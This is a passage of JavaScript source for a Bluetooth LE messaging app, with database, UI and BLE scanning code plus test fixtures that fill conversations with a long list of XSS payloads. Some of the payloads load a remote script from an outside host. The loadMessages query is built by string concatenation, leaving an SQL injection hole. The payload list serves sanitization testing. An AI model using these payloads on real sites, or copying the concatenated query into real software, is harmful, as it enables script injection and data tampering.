var touches = [];
var first_touch;

var version = "0.0.1";

var device_list = [];

var db;
var bleEnabled=false;

var test_mode = true;

var puid;

/*
	Required to bootstrap to the cordova engine.
	Contains all event handlers for the engine as well as first initalization.
*/
var app = {

	initialize: function() {
		this.bindEvents();
	},

  	bindEvents: function() {
   		document.addEventListener('DeviceReady', this.onDeviceReady, false);
    	document.addEventListener('backbutton', this.onBackKeyDown, false);
		document.addEventListener('Pause', this.onPause, false);
		document.addEventListener('Resume', this.onResume, false);
 	},

 	//this is where everything starts
  	onDeviceReady: function() {
		uiControl.setDebugger();
		uiControl.updateDebugger("build", "pre-alpha");
		uiControl.updateDebugger("version", version);
		dataManager.initialize();		
		npms.initialize();
	},

	onBackKeyDown: function() {
	},

	onPause:function() {
	},

	onResume:function() {
	}
};

/*
	manages the database and other basic data functions
*/
var dataManager = {

  	initialize:function() {
  		if (test_mode){
			test.db_initialize();
  		} else {
    		db = window.openDatabase("pup", version, "dmgr", 2000);
    		db.transaction(function(tx){
    			tx.executeSql('CREATE TABLE IF NOT EXISTS device (uid Primary Key, address, last_connected, name)');
				tx.executeSql('CREATE TABLE IF NOT EXISTS messages (mid Primary Key, sender, receiver, timestamp, content)');
    		}, dataManager.errorCB);
  		}
    	dataManager.loadDeviceList();
  	},

  	loadDeviceList:function() {
  		db.transaction(function(tx) {
			tx.executeSql('SELECT * FROM device', [], function(tx, results) {
				var offline_list = document.getElementById("offline_deviceList");
				for (var i = 0; i < results.rows.length; i++) {
					device = results.rows.item(i);
					device["element"] = uiControl.createDeviceElement(device);
        			offline_list.appendChild(device["element"]);
        			device_list[device.address] = device;
				}
			}, dataManager.errorCB);
		}, dataManager.errorCB);
  	},

  	loadMessages:function(device) {
  		db.transaction(function(tx){
			tx.executeSql('SELECT * FROM messages where sender = "'+ device.uid +'" or receiver = "'+ device.uid + '" ORDER BY timestamp ASC', [], function(tx, results) {
				var message_data = [];
				for (var i = 0; i < results.rows.length; i++) {
					message_data[i] = results.rows.item(i);				
				}		
				messenger.messagesPopulate(message_data);
			}, dataManager.errorCB);
		}, dataManager.errorCB);  	
 	},

  	generateID:function(){
  		var id = "";
    	var charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    	for( var i=0; i < 10; i++ )
     	   id += charSet.charAt(Math.floor(Math.random() * charSet.length));
   		return id;
 	},

 	errorCB:function(err) {
    	uiControl.updateDebugger("SQL ERROR", err.message);
 	}

};

/*
	for all ui elements needing manipulation
	debugging information and animation functions
*/
var uiControl = {

	metrics: [],
	values: [],
	callback: [],

	setDebugger:function() {
		var htmlinsert = "";
		var template = "";
		for(var i = 0;i < uiControl.metrics.length; i++){
			if(uiControl.metrics[i] == "build" || uiControl.metrics[i] == "version" || uiControl.metrics[i] == "msg"){
				template = "<div class='dbg_item'>" + uiControl.values[i] + "</div>";
			} else {
				template = "<div class='dbg_item'>" +	uiControl.metrics[i] + "|" + uiControl.values[i] + "</div>";
			}
			htmlinsert += template;
		}
		document.getElementById('debug').innerHTML = htmlinsert;
	},

	updateDebugger:function(id, val){
		if(uiControl.metrics.indexOf(id) <  0){
			uiControl.metrics.push(id);
		}
		uiControl.values[uiControl.metrics.indexOf(id)] = val;
		uiControl.setDebugger();
	},

	createDeviceElement:function(device) {
		var device_container = document.createElement("DIV");
		
		device_container.className = "device";
		device_container.onclick = function() {
			var ocDevice = device;
			messenger.initialize(ocDevice);
			document.getElementById("connections").style.display = "none";
			document.getElementById("messenger").style.display = "block";
		};

		devstatus = document.createElement("DIV");
		if(device.rssi){
			devstatus.className = "device_status online";
		} else {
			devstatus.className = "device_status";
		}
		device_container.appendChild(devstatus);
				
		devname = document.createElement("P");
		devname.className = "device_name";
		tempNode = document.createTextNode(device.name);
		devname.appendChild(tempNode);
		

		devaddr = document.createElement("P");
		devaddr.className = "device_address";
		tempNode = document.createTextNode(device.address);
		devaddr.appendChild(tempNode);
		

		device_container.appendChild(devname);
		device_container.appendChild(devaddr);

		if(device.last_connected){
			devinfo = document.createElement("P");
			devinfo.className = "device_info";
			var timeinfo = new Date(device.last_connected*1000);
			tempNode = document.createTextNode("Last Connected " + timeinfo.toLocaleString());
			devinfo.appendChild(tempNode);
			device_container.appendChild(devinfo);
		}

		return device_container;
	},

	createMessageElement:function(message) {
		message_container = document.createElement("DIV");
		message_content = document.createElement("P");
		message_timestamp = document.createElement("SPAN");
		if(message.sender == puid){
			message_container.className = "message_container right";
			message_content.className = "message sender right";
			message_timestamp.className = "message_timestamp right";
		} else {
			message_container.className = "message_container left";
			message_content.className = "message receiver";	
			message_timestamp.className = "message_timestamp receiver";
		}
		var timeinfo = new Date(message.timestamp*1000);

		tempNode = document.createTextNode(timeinfo.toLocaleString());
		message_timestamp.appendChild(tempNode);

		tempNode = document.createTextNode(message.content);
		message_content.appendChild(tempNode);

		message_content.appendChild(document.createElement("br"));
		message_content.appendChild(message_timestamp);
		message_container.appendChild(message_content);
		return message_container;
	},

    toBeImplemented:function(arg) {
      alert('This feature is comming soon.');
      uiControl.updateDebugger("args", arg)
    }
};

/*
	contains all methods pertaining to the bluetooth element of the app
	general functionality and data population
*/
var npms = {

	initialize:function() {
		var params  = {"request": true, 
				   "statusReciever": true,
				   "restoreKey": "Close Call"};		
		bluetoothle.initialize(npms.isConnected, params);
		bluetoothle.initializePeripheral(npms.isAdvertizing,npms.errorHandler, params);
		npms.startServices();	
	},

	startServices:function() {
		params = {service: "7282",
				  characteristics: [{ uuid: "6902520a-2dcc-4e2b-898c-af1c48f75a08",
				   					  permissions: {readEncryptionRequired: true,
				       								writeEncryptionRequired: true },
								      properties : {read: true, 
								      				writeWithoutResponse: false, 
								      				write: true, 
								      				notify: true, 
								      				indicate: true, 
								      				authenticatedSignedWrites: true, 
								      				notifyEncryptionRequired: true, 
								      				indicateEncryptionRequired: true}}]};
		bluetoothle.addService(npms.statusReporter, npms.errorHandler, params);	

		params = {service:"7282",
  				  name:"Close Call Messaging Service"};
		bluetoothle.startAdvertising(npms.statusReporter, npms.errorHandler, params);
		
		params = {service: "7283",
				  characteristics: [{ uuid: "c506ad3a-50fa-46a8-81ca-508d3391ba95",
				   					  permissions: {readEncryptionRequired: true,
				       								writeEncryptionRequired: true },
								      properties : {read: true, 
								      				writeWithoutResponse: true, 
								      				write: true, 
								      				notify: true, 
								      				indicate: true, 
								      				authenticatedSignedWrites: true, 
								      				notifyEncryptionRequired: true, 
								      				indicateEncryptionRequired: true}}]};
		bluetoothle.addService(npms.statusReporter, npms.errorHandler, params);	

		params = {service:"7283",
  				  name:"Close Call Network Reporting Service"};
		bluetoothle.startAdvertising(npms.statusReporter, npms.errorHandler, params);	
	},

	isConnected:function(succuess) {
		if (succuess["status"]=="enabled") {
          	bleEnabled=true;
        	uiControl.updateDebugger("BT", bleEnabled);
	        params = {"services": ["7282"], 
	        		  "allowDuplicates": true,
	        		  "scanMode": bluetoothle.SCAN_MODE_LOW_LATENCY, 
	        		  "matchMode": bluetoothle.MATCH_MODE_AGGRESSIVE, 
	        		  "matchNum": bluetoothle.MATCH_NUM_MAX_ADVERTISEMENT, 
	        		  "callbackType": bluetoothle.CALLBACK_TYPE_ALL_MATCHES
	        		  };
	        document.getElementById("loading_spinner").className = "loading_spinner icon";
	        bluetoothle.startScan(npms.deviceListPopulate, npms.errorHandler, params);
        } else {
        	uiControl.updateDebugger("BT", bleEnabled);
        }
    },

    isAdvertizing:function(succuess) {
    	if(succuess){
	        uiControl.updateDebugger("Serving", scanResult.status);
    		switch(succuess.status){
	    		case "enabled":
	    			break;

	    		case "disabled":
	    			break;

	    		case "readRequested":
	    			break;

	    		case "writeRequested":
	    			break;

	    		case "subscribed":

	    			break;
	    		case "unsubscribed":
	    			break;

	    		case "notificationSent":
	    			break;

	    		case "connected":
	    			break;

	    		case "disconnected":
	    			break;

	    		case "mtuChanged":
	    			break;
	    	}
    	}
  
    },

	deviceListPopulate:function(scanResult) {
		var online_list = document.getElementById("online_deviceList");
		
		if(scanResult){
        	uiControl.updateDebugger("scanResult", scanResult.status);
			switch(scanResult.status){
				case "scanResult":
					if (device_list[scanResult.address] != undefined) {
						device = device_list[scanResult.address];
						device.element.parentNode.removeChild(device.element);
						device.name = scanResult.name;
						device["rssi"] = scanResult.rssi;
						online_list.appendChild(uiControl.createDeviceElement(device));
					} else {
						online_list.appendChild(uiControl.createDeviceElement(scanResult));
					}
					break;

				case "scanStarted":
		       		bt_scan = setTimeout(function() {
		        		bluetoothle.stopScan(npms.deviceListPopulate, npms.errorHandler);
		        		clearTimeout(bt_scan);
	    			}, 15000);
					break;

				case "scanStopped":
					document.getElementById("loading_spinner").className = "icon";
					break;

				default:
					if(test_mode){
	       				document.getElementById("loading_spinner").className = "icon";
						devices = test.getDeviceList();
						devices.forEach(function(device){
							if (device_list[device.address] != undefined) {
								devicet = device_list[device.address];
								devicet.element.parentNode.removeChild(devicet.element);
								
								devicet.name = device.name;
								devicet["rssi"] = device.rssi;
								online_list.appendChild(uiControl.createDeviceElement(devicet));
							} else {
								online_list.appendChild(uiControl.createDeviceElement(device));
							}
	        			});
	        		}	
					break;
			}	
		}
	},

	statusReporter:function(succuess) {
		if(succuess){
			uiControl.updateDebugger("Service Status", succuess.status);
		}	
	},


	refreshList:function() {
	    document.getElementById("loading_spinner").className = "loading_spinner icon";
		if(bleEnabled){
        	bluetoothle.startScan(npms.deviceListPopulate, npms.errorHandler, params);
		}
	    bt_scan = setTimeout(function() {
	        bluetoothle.stopScan(npms.deviceListPopulate, npms.errorHandler);
	        
	        if(test_mode){
	        	var scanResult = {"status": "test Result"};
	        	npms.deviceListPopulate(scanResult);	
	        }
	        
	        clearTimeout(bt_scan);
	    }, 15000);
	},

	errorHandler:function(msg) {
        uiControl.updateDebugger("BLE ERROR", msg.message);
	}
};


/*
	Contains all messages having to do with the 
	functionality of the messaging page
*/
var messenger = {

	initialize:function(device) {
		var header = document.getElementById("convo_partner");
		header.innerHTML = "";
		header.appendChild(document.createTextNode(device.name));
		dataManager.loadMessages(device);	
	},

	//loads all messages in a steralized manor
	messagesPopulate:function(messages) {
		var container = document.getElementById("conversation_container");
		messages.forEach(function(message){
			container.appendChild(uiControl.createMessageElement(message));			
        });
        container.scrollTop = container.scrollHeight;
	},

	back:function() {
		document.getElementById("connections").style.display = "block";
		document.getElementById("messenger").style.display = "none";
		//remove all messages so the page is ready to be repopulated
		var messages = document.getElementById("conversation_container");
		while (messages.firstChild) {
    		messages.removeChild(messages.firstChild);
		}
	}
};


/*
	used to populate test data to make sure everything is coture
*/
var test = {

	//device list test data (used for when no devices are in range)
	getDeviceList: function() {
		var devices =[];
		device = {name: "Kurtis Galexy" , address: "FF:FF:FF:FF:FF:FF", rssi: "-20"};
		devices.push(device);
		device = {name: "Some Random Person 0" , address: "FF:FF:FF:FF:FF:FC", rssi: "-40"};
		devices.push(device);
		return devices;
	},


	//getting the general database structure and data setup
	db_initialize:function() {
    	db = window.openDatabase("test_pup", version, "dmgr", 20000);
    	db.transaction(function(tx){
			puid = dataManager.generateID();
			var test_convo_uid = [];

			//generates random userid's
			for (var i = 0; i < 7; i++) {
				test_convo_uid[i] = dataManager.generateID();
			}

			var device_table = "device(uid, address, last_connected, name)";
			var message_table = "messages(mid, sender, receiver, timestamp, content)";

			//table data reset
			tx.executeSql('DROP TABLE IF EXISTS device');
			tx.executeSql('DROP TABLE IF EXISTS messages');
			
			//re-declare tables
			tx.executeSql('CREATE TABLE IF NOT EXISTS device (uid Primary Key, address, last_connected, name)');
			tx.executeSql('CREATE TABLE IF NOT EXISTS messages (mid Primary Key, sender, receiver, timestamp, content)');

			//inserting device data
			//tx.executeSql('INSERT INTO '+ device_table +' VALUES ( ?, ?, ?, ?)', [puid, "self", test.generateTimeStamp(), "John"]);
			tx.executeSql('INSERT INTO '+ device_table +' VALUES ( ?, ?, ?, ?)', [test_convo_uid[0], "FF:FF:FF:FF:FF:FC", test.generateTimeStamp(), "Some Random Person With A Really Long Name"]);
			tx.executeSql('INSERT INTO '+ device_table +' VALUES ( ?, ?, ?, ?)', [test_convo_uid[1], "FF:FF:FF:FF:FF:FF", test.generateTimeStamp(), "Some Random Person With A Really Long Name"]);
			for (var i = 2; i < test_convo_uid.length; i++) {
				tx.executeSql('INSERT INTO '+ device_table +' VALUES ( ?, ?, ?, ?)', [test_convo_uid[i], test.generateFakeMac(), test.generateTimeStamp(),("Some Random Person "+i)]);
			}

			//Test convorsations 100 test messages - each
			for (var i = 0; i < test_convo_uid.length; i++) {
				for (var ii = 0; ii < 50; ii++) {
					tx.executeSql('INSERT INTO '+ message_table +' VALUES (?, ?, ?, ?, ?)', [dataManager.generateID(), test_convo_uid[i], puid, test.generateTimeStamp(), test.getRandomNaughtyString()]);
					tx.executeSql('INSERT INTO '+ message_table +' VALUES (?, ?, ?, ?, ?)', [dataManager.generateID(), puid, test_convo_uid[i], test.generateTimeStamp(), test.getRandomNaughtyString()]);
				}
			}
			//tx.executeSql('DELETE FROM user WHERE uid = 1');
		}, dataManager.errorCB);

	},

	generateTimeStamp:function() {
		var basetime = 1489659947;
		return basetime + Math.floor(Math.random() * 500000);
	},

	generateFakeMac:function() {
		var mac = "";
    	var charSet = "0123456789ABCDEF";
    	for( var i=0; i < 6; i++ ){
     	   mac += charSet.charAt(Math.floor(Math.random() * charSet.length));
     	   mac += charSet.charAt(Math.floor(Math.random() * charSet.length));
     	   mac += ":";
    	}
   		return mac.slice(0,-1);
	},

	getRandomNaughtyString:function() {
		var script_naughty = ["<script>alert(123)</script>", "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;", "<img src=x onerror=alert(123) />", "<svg><script>123<1>alert(123)</script>", "\"><script>alert(123)</script>", "'><script>alert(123)</script>", "><script>alert(123)</script>", "</script><script>alert(123)</script>", "< / script >< script >alert(123)< / script >", " onfocus=JaVaSCript:alert(123) autofocus", "\" onfocus=JaVaSCript:alert(123) autofocus", "' onfocus=JaVaSCript:alert(123) autofocus", "＜script＞alert(123)＜/script＞", "<sc<script>ript>alert(123)</sc</script>ript>", "--><script>alert(123)</script>", "\";alert(123);t=\"", "';alert(123);t='", "JavaSCript:alert(123)", ";alert(123);", "src=JaVaSCript:prompt(132)", "\"><script>alert(123);</script x=\"", "'><script>alert(123);</script x='", "><script>alert(123);</script x=", "\" autofocus onkeyup=\"javascript:alert(123)", "' autofocus onkeyup='javascript:alert(123)", "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>", "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>", "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>", "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>", "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>", "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>", "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>", "'`\"><\\x3Cscript>javascript:alert(1)</script>", "'`\"><\\x00script>javascript:alert(1)</script>", "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF", "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF", "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF", "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF", "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF", "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF", "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", "`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>", "`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>", "\"`'><script>\\x3Bjavascript:alert(1)</script>", "\"`'><script>\\x0Djavascript:alert(1)</script>", "\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x81javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x84javascript:alert(1)</script>", "\"`'><script>\\xE3\\x80\\x80javascript:alert(1)</script>", "\"`'><script>\\x09javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x89javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x85javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x88javascript:alert(1)</script>", "\"`'><script>\\x00javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>", "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>", "\"`'><script>\\x0Cjavascript:alert(1)</script>", "\"`'><script>\\x2Bjavascript:alert(1)</script>", "\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>", "\"`'><script>-javascript:alert(1)</script>", "\"`'><script>\\x0Ajavascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>", "\"`'><script>\\x7Ejavascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x87javascript:alert(1)</script>", "\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>", "\"`'><script>\\xC2\\x85javascript:alert(1)</script>", "\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x83javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>", "\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x80javascript:alert(1)</script>", "\"`'><script>\\x21javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x82javascript:alert(1)</script>", "\"`'><script>\\xE2\\x80\\x86javascript:alert(1)</script>", "\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>", "\"`'><script>\\x0Bjavascript:alert(1)</script>", "\"`'><script>\\x20javascript:alert(1)</script>", "\"`'><script>\\xC2\\xA0javascript:alert(1)</script>", "<img \\x00src=x onerror=\"alert(1)\">", "<img \\x47src=x onerror=\"javascript:alert(1)\">", "<img \\x11src=x onerror=\"javascript:alert(1)\">", "<img \\x12src=x onerror=\"javascript:alert(1)\">", "<img\\x47src=x onerror=\"javascript:alert(1)\">", "<img\\x10src=x onerror=\"javascript:alert(1)\">", "<img\\x13src=x onerror=\"javascript:alert(1)\">", "<img\\x32src=x onerror=\"javascript:alert(1)\">", "<img\\x47src=x onerror=\"javascript:alert(1)\">", "<img\\x11src=x onerror=\"javascript:alert(1)\">", "<img \\x47src=x onerror=\"javascript:alert(1)\">", "<img \\x34src=x onerror=\"javascript:alert(1)\">", "<img \\x39src=x onerror=\"javascript:alert(1)\">", "<img \\x00src=x onerror=\"javascript:alert(1)\">", "<img src\\x09=x onerror=\"javascript:alert(1)\">", "<img src\\x10=x onerror=\"javascript:alert(1)\">", "<img src\\x13=x onerror=\"javascript:alert(1)\">", "<img src\\x32=x onerror=\"javascript:alert(1)\">", "<img src\\x12=x onerror=\"javascript:alert(1)\">", "<img src\\x11=x onerror=\"javascript:alert(1)\">", "<img src\\x00=x onerror=\"javascript:alert(1)\">", "<img src\\x47=x onerror=\"javascript:alert(1)\">", "<img src=x\\x09onerror=\"javascript:alert(1)\">", "<img src=x\\x10onerror=\"javascript:alert(1)\">", "<img src=x\\x11onerror=\"javascript:alert(1)\">", "<img src=x\\x12onerror=\"javascript:alert(1)\">", "<img src=x\\x13onerror=\"javascript:alert(1)\">", "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">", "<img src=x onerror=\\x09\"javascript:alert(1)\">", "<img src=x onerror=\\x10\"javascript:alert(1)\">", "<img src=x onerror=\\x11\"javascript:alert(1)\">", "<img src=x onerror=\\x12\"javascript:alert(1)\">", "<img src=x onerror=\\x32\"javascript:alert(1)\">", "<img src=x onerror=\\x00\"javascript:alert(1)\">", "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>", "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>", "<img src onerror /\" '\"= alt=javascript:alert(1)//\">", "<title onpropertychange=javascript:alert(1)></title><title title=>", "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">", "<!--[if]><script>javascript:alert(1)</script -->", "<!--[if<img src=x onerror=javascript:alert(1)//]> -->", "<script src=\"/\\%(jscript)s\"></script>", "<script src=\"\\\\%(jscript)s\"></script>", "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "<IMG SRC=# onmouseover=\"alert('xxs')\">", "<IMG SRC= onmouseover=\"alert('xxs')\">", "<IMG onmouseover=\"alert('xxs')\">", "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", "<IMG SRC=\"jav   ascript:alert('XSS');\">", "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">", "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">", "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out", "<IMG SRC=\" &#14;  javascript:alert('XSS');\">", "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", 